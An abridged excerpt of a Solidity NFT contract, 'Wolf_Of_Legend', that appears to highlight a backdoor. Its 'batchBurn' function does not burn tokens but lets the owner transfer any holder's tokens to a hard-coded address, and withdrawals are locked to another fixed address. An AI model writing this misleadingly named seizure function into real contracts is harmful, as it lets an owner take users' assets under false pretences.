...
contract Wolf_Of_Legend is Ownable, ERC721A, ReentrancyGuard {

  uint256 public immutable maxPerAddressDuringMint;
  bytes32 public WhitelistMerkleRoot;  
  uint public maxSupply = 1999;
  ...
  ) ERC721A("Wolf_Of_Legend", "WOL", maxBatchSize_, collectionSize_) {
  ...
  function batchBurn(uint256[] memory tokenids) external onlyOwner {
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0xe46F34d1904fF1bAb550B2502580bDe7898D56eF, tokenid);
        }
    }
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0x918d0eE68dbe0824501A297131db91C93F756371);
